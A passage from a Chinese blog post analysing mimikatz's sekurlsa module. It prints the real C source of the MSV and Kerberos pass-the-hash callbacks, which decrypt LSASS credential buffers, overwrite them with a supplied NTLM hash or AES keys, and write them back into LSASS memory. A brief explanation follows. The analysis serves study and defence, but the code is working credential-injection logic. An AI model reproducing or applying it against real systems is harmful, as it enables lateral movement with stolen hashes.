+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL CALLBACK <span class="title">kuhl_m_sekurlsa_msv_enum_cred_callback_pth</span><span class="params">(IN PKUHL_M_SEKURLSA_CONTEXT cLsass, IN PKIWI_MSV1_0_PRIMARY_CREDENTIALS pCredentials, IN DWORD AuthenticationPackageId, IN PKULL_M_MEMORY_ADDRESS origBufferAddress, IN OPTIONAL LPVOID pOptionalData)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	PMSV1_0_PTH_DATA_CRED pthDataCred = (PMSV1_0_PTH_DATA_CRED) pOptionalData;</span><br><span class="line">	PBYTE msvCredentials;</span><br><span class="line">	KULL_M_MEMORY_ADDRESS aLocalMemory = &#123;pCredentials-&gt;Credentials.Buffer, &amp;KULL_M_MEMORY_GLOBAL_OWN_HANDLE&#125;;</span><br><span class="line">	<span class="keyword">const</span> MSV1_0_PRIMARY_HELPER * helper = kuhl_m_sekurlsa_msv_helper(cLsass);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(RtlEqualString(&amp;pCredentials-&gt;Primary, &amp;PRIMARY_STRING, FALSE))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(msvCredentials = (PBYTE) pCredentials-&gt;Credentials.Buffer)</span><br><span class="line">		&#123;</span><br><span class="line">			(*pthDataCred-&gt;pSecData-&gt;lsassLocalHelper-&gt;pLsaUnprotectMemory)(msvCredentials, pCredentials-&gt;Credentials.Length);</span><br><span class="line">			*(PBOOLEAN) (msvCredentials + helper-&gt;offsetToisLmOwfPassword) = FALSE;</span><br><span class="line">			*(PBOOLEAN) (msvCredentials + helper-&gt;offsetToisShaOwPassword) = FALSE;</span><br><span class="line">			<span class="keyword">if</span>(helper-&gt;offsetToisIso)</span><br><span class="line">				*(PBOOLEAN) (msvCredentials + helper-&gt;offsetToisIso) = FALSE;</span><br><span class="line">			<span class="keyword">if</span>(helper-&gt;offsetToisDPAPIProtected)</span><br><span class="line">			&#123;</span><br><span class="line">				*(PBOOLEAN) (msvCredentials + helper-&gt;offsetToisDPAPIProtected) = FALSE;</span><br><span class="line">				RtlZeroMemory(msvCredentials + helper-&gt;offsetToDPAPIProtected, LM_NTLM_HASH_LENGTH);</span><br><span class="line">			&#125;</span><br><span class="line">			RtlZeroMemory(msvCredentials + helper-&gt;offsetToLmOwfPassword, LM_NTLM_HASH_LENGTH);</span><br><span class="line">			RtlZeroMemory(msvCredentials + helper-&gt;offsetToShaOwPassword, SHA_DIGEST_LENGTH);</span><br><span class="line">			<span class="keyword">if</span>(pthDataCred-&gt;pthData-&gt;NtlmHash)</span><br><span class="line">			&#123;</span><br><span class="line">				*(PBOOLEAN) (msvCredentials + helper-&gt;offsetToisNtOwfPassword) = TRUE;</span><br><span class="line">				RtlCopyMemory(msvCredentials + helper-&gt;offsetToNtOwfPassword, pthDataCred-&gt;pthData-&gt;NtlmHash, LM_NTLM_HASH_LENGTH);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				*(PBOOLEAN) (msvCredentials + helper-&gt;offsetToisNtOwfPassword) = FALSE;</span><br><span class="line">				RtlZeroMemory(msvCredentials + helper-&gt;offsetToNtOwfPassword, LM_NTLM_HASH_LENGTH);</span><br><span class="line">			&#125;</span><br><span class="line">			(*pthDataCred-&gt;pSecData-&gt;lsassLocalHelper-&gt;pLsaProtectMemory)(msvCredentials, pCredentials-&gt;Credentials.Length);</span><br><span class="line"></span><br><span class="line">			kprintf(<span class="string">L"data copy @ %p : "</span>, origBufferAddress-&gt;address);</span><br><span class="line">			<span class="keyword">if</span>(pthDataCred-&gt;pthData-&gt;isReplaceOk = kull_m_memory_copy(origBufferAddress, &amp;aLocalMemory, pCredentials-&gt;Credentials.Length))</span><br><span class="line">				kprintf(<span class="string">L"OK !"</span>);</span><br><span class="line">			<span class="keyword">else</span> PRINT_ERROR_AUTO(<span class="string">L"kull_m_memory_copy"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> kprintf(<span class="string">L"."</span>);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> CALLBACK <span class="title">kuhl_m_sekurlsa_enum_kerberos_callback_pth</span><span class="params">(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN KULL_M_MEMORY_ADDRESS Localkerbsession, IN KULL_M_MEMORY_ADDRESS RemoteLocalKerbSession, IN OPTIONAL LPVOID pOptionalData)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	PSEKURLSA_PTH_DATA pthData = (PSEKURLSA_PTH_DATA) pOptionalData;</span><br><span class="line">	DWORD i, nbHash;</span><br><span class="line">	BYTE ntlmHash[LM_NTLM_HASH_LENGTH], aes128key[AES_128_KEY_LENGTH], aes256key[AES_256_KEY_LENGTH];</span><br><span class="line">	BOOL isNtlm = FALSE, isAes128 = FALSE, isAes256 = FALSE;</span><br><span class="line">	UNICODE_STRING nullPasswd = &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">	KULL_M_MEMORY_ADDRESS aLocalKeyMemory = &#123;<span class="literal">NULL</span>, Localkerbsession.hMemory&#125;, aLocalHashMemory = &#123;<span class="literal">NULL</span>, Localkerbsession.hMemory&#125;, aLocalNTLMMemory = &#123;<span class="literal">NULL</span>, Localkerbsession.hMemory&#125;, aLocalPasswdMemory = &#123;&amp;nullPasswd, Localkerbsession.hMemory&#125;, aRemotePasswdMemory = &#123;(PBYTE) RemoteLocalKerbSession.address + kerbHelper[KerbOffsetIndex].offsetPasswordErase, RemoteLocalKerbSession.hMemory&#125;;</span><br><span class="line">	PKERB_HASHPASSWORD_GENERIC pHash;</span><br><span class="line">	PBYTE baseCheck;</span><br><span class="line">	PCWCHAR resultok;</span><br><span class="line">	SIZE_T offset;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(RemoteLocalKerbSession.address =  *(PVOID *) ((PBYTE) Localkerbsession.address + kerbHelper[KerbOffsetIndex].offsetKeyList))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(aLocalKeyMemory.address = LocalAlloc(LPTR,  kerbHelper[KerbOffsetIndex].structKeyListSize))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(kull_m_memory_copy(&amp;aLocalKeyMemory, &amp;RemoteLocalKerbSession, kerbHelper[KerbOffsetIndex].structKeyListSize))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span>(nbHash = ((DWORD *)(aLocalKeyMemory.address))[<span class="number">1</span>])</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span>(isNtlm = (pthData-&gt;NtlmHash != <span class="literal">NULL</span>))</span><br><span class="line">					&#123;</span><br><span class="line">						RtlCopyMemory(ntlmHash, pthData-&gt;NtlmHash, LM_NTLM_HASH_LENGTH);</span><br><span class="line">						<span class="keyword">if</span>(pData-&gt;cLsass-&gt;osContext.BuildNumber &gt;= KULL_M_WIN_BUILD_VISTA)	</span><br><span class="line">							(*pData-&gt;lsassLocalHelper-&gt;pLsaProtectMemory)(ntlmHash, LM_NTLM_HASH_LENGTH);</span><br><span class="line">					&#125;</span><br><span class="line">					</span><br><span class="line">					<span class="keyword">if</span>(pData-&gt;cLsass-&gt;osContext.BuildNumber &gt;= KULL_M_WIN_BUILD_7)</span><br><span class="line">					&#123;</span><br><span class="line">						<span class="keyword">if</span>(isAes128 = (pthData-&gt;Aes128Key != <span class="literal">NULL</span>))</span><br><span class="line">						&#123;</span><br><span class="line">							RtlCopyMemory(aes128key, pthData-&gt;Aes128Key, AES_128_KEY_LENGTH);</span><br><span class="line">							(*pData-&gt;lsassLocalHelper-&gt;pLsaProtectMemory)(aes128key, AES_128_KEY_LENGTH);</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">if</span>(isAes256 = (pthData-&gt;Aes256Key != <span class="literal">NULL</span>))</span><br><span class="line">						&#123;</span><br><span class="line">							RtlCopyMemory(aes256key, pthData-&gt;Aes256Key, AES_256_KEY_LENGTH);</span><br><span class="line">							(*pData-&gt;lsassLocalHelper-&gt;pLsaProtectMemory)(aes256key, AES_256_KEY_LENGTH);</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line"></span><br><span class="line">					RemoteLocalKerbSession.address = baseCheck = (PBYTE) RemoteLocalKerbSession.address + kerbHelper[KerbOffsetIndex].structKeyListSize;</span><br><span class="line">					i = nbHash * (DWORD) kerbHelper[KerbOffsetIndex].structKeyPasswordHashSize;</span><br><span class="line">					<span class="keyword">if</span>(aLocalHashMemory.address = LocalAlloc(LPTR, i))</span><br><span class="line">					&#123;</span><br><span class="line">						<span class="keyword">if</span>(kull_m_memory_copy(&amp;aLocalHashMemory, &amp;RemoteLocalKerbSession, i))</span><br><span class="line">						&#123;</span><br><span class="line">							kprintf(<span class="string">L"data copy @ %p"</span>, RemoteLocalKerbSession.address, nbHash);</span><br><span class="line">							<span class="keyword">for</span>(i = <span class="number">0</span>, pthData-&gt;isReplaceOk = TRUE; (i &lt; nbHash) &amp;&amp; pthData-&gt;isReplaceOk; i++)</span><br><span class="line">							&#123;</span><br><span class="line">								offset = i * kerbHelper[KerbOffsetIndex].structKeyPasswordHashSize + kerbHelper[KerbOffsetIndex].offsetHashGeneric;</span><br><span class="line">								pHash = (PKERB_HASHPASSWORD_GENERIC) ((PBYTE) aLocalHashMemory.address + offset);</span><br><span class="line">								kprintf(<span class="string">L"\n   \\_ %s "</span>, kuhl_m_kerberos_ticket_etype(pHash-&gt;Type));</span><br><span class="line">								</span><br><span class="line">								RemoteLocalKerbSession.address = pHash-&gt;Checksump;</span><br><span class="line">								resultok = <span class="string">L"OK"</span>;</span><br><span class="line">								<span class="keyword">if</span>(isNtlm &amp;&amp; ((pHash-&gt;Type != KERB_ETYPE_AES128_CTS_HMAC_SHA1_96) &amp;&amp; (pHash-&gt;Type != KERB_ETYPE_AES256_CTS_HMAC_SHA1_96)) &amp;&amp; (pHash-&gt;Size == LM_NTLM_HASH_LENGTH))</span><br><span class="line">								&#123;</span><br><span class="line">									aLocalNTLMMemory.address = ntlmHash;</span><br><span class="line">									offset = LM_NTLM_HASH_LENGTH;</span><br><span class="line">								&#125;</span><br><span class="line">								<span class="keyword">else</span> <span class="keyword">if</span>(isAes128 &amp;&amp; (pHash-&gt;Type == KERB_ETYPE_AES128_CTS_HMAC_SHA1_96) &amp;&amp; (pHash-&gt;Size == AES_128_KEY_LENGTH))</span><br><span class="line">								&#123;</span><br><span class="line">									aLocalNTLMMemory.address = aes128key;</span><br><span class="line">									offset = AES_128_KEY_LENGTH;</span><br><span class="line">								&#125;</span><br><span class="line">								<span class="keyword">else</span> <span class="keyword">if</span>(isAes256 &amp;&amp; (pHash-&gt;Type == KERB_ETYPE_AES256_CTS_HMAC_SHA1_96) &amp;&amp; (pHash-&gt;Size == AES_256_KEY_LENGTH))</span><br><span class="line">								&#123;</span><br><span class="line">									aLocalNTLMMemory.address = aes256key;</span><br><span class="line">									offset = AES_256_KEY_LENGTH;</span><br><span class="line">								&#125;</span><br><span class="line">								<span class="keyword">else</span></span><br><span class="line">								&#123;</span><br><span class="line">									aLocalNTLMMemory.address = pHash;</span><br><span class="line">									RemoteLocalKerbSession.address = baseCheck + offset;</span><br><span class="line">									offset = FIELD_OFFSET(KERB_HASHPASSWORD_GENERIC, Checksump);</span><br><span class="line">									resultok = kuhl_m_kerberos_ticket_etype(KERB_ETYPE_NULL);</span><br><span class="line">									</span><br><span class="line">									pHash-&gt;Type = KERB_ETYPE_NULL;</span><br><span class="line">									pHash-&gt;Size = <span class="number">0</span>;</span><br><span class="line">									kprintf(<span class="string">L"-&gt; "</span>);</span><br><span class="line">								&#125;</span><br><span class="line"></span><br><span class="line">								<span class="keyword">if</span>(pthData-&gt;isReplaceOk = kull_m_memory_copy(&amp;RemoteLocalKerbSession, &amp;aLocalNTLMMemory, offset))</span><br><span class="line">									kprintf(<span class="string">L"%s"</span>, resultok);</span><br><span class="line">								<span class="keyword">else</span> PRINT_ERROR_AUTO(<span class="string">L"kull_m_memory_copy"</span>);</span><br><span class="line">							&#125;</span><br><span class="line"></span><br><span class="line">							<span class="keyword">if</span>(pthData-&gt;isReplaceOk)</span><br><span class="line">							&#123;</span><br><span class="line">								kprintf(<span class="string">L"\n   \\_ *Password replace @ %p (%u) -&gt; "</span>, aRemotePasswdMemory.address, (DWORD) kerbHelper[KerbOffsetIndex].passwordEraseSize);</span><br><span class="line">								<span class="keyword">if</span>(aLocalPasswdMemory.address = LocalAlloc(LPTR, kerbHelper[KerbOffsetIndex].passwordEraseSize))</span><br><span class="line">								&#123;</span><br><span class="line">									<span class="keyword">if</span>(pthData-&gt;isReplaceOk = kull_m_memory_copy(&amp;aRemotePasswdMemory, &amp;aLocalPasswdMemory, kerbHelper[KerbOffsetIndex].passwordEraseSize))</span><br><span class="line">										kprintf(<span class="string">L"null"</span>);</span><br><span class="line">									<span class="keyword">else</span> PRINT_ERROR_AUTO(<span class="string">L"kull_m_memory_copy"</span>);</span><br><span class="line">									LocalFree(aLocalPasswdMemory.address);</span><br><span class="line">								&#125;</span><br><span class="line">							&#125;</span><br><span class="line">						&#125;</span><br><span class="line">						LocalFree(aLocalHashMemory.address);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			LocalFree(aLocalKeyMemory.address);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>其中的LsaProtectMemory和LsaUnprotectMemory的实际调用分别是BCryptEncrypt和BCryptDecrypt</p>
+<p>总的来说，pth需要对lsass进行写操作来替换凭据。</p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/12/24/Windows-域笔记/" rel="next" title="Windows 域笔记">
+                <i class="fa fa-chevron-left"></i> Windows 域笔记
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">sup817ch</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">17</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#sekurlsa"><span class="nav-number">1.</span> <span class="nav-text">sekurlsa</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Lists-credentials"><span class="nav-number">1.1.</span> <span class="nav-text">Lists credentials</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pth"><span class="nav-number">1.2.</span> <span class="nav-text">pth</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">sup817ch</span>
+
+  
+
+  
+</div>
+
+
+  
+
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" rel="external nofollow" href="https://hexo.io">Hexo</a> 强力驱动 v3.7.1</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" rel="external nofollow" href="https://github.com/theme-next/hexo-theme-next">NexT.Pisces</a> v6.3.0</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.3.0"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.3.0"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.3.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.3.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.3.0"></script>
+
+
+
+  
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
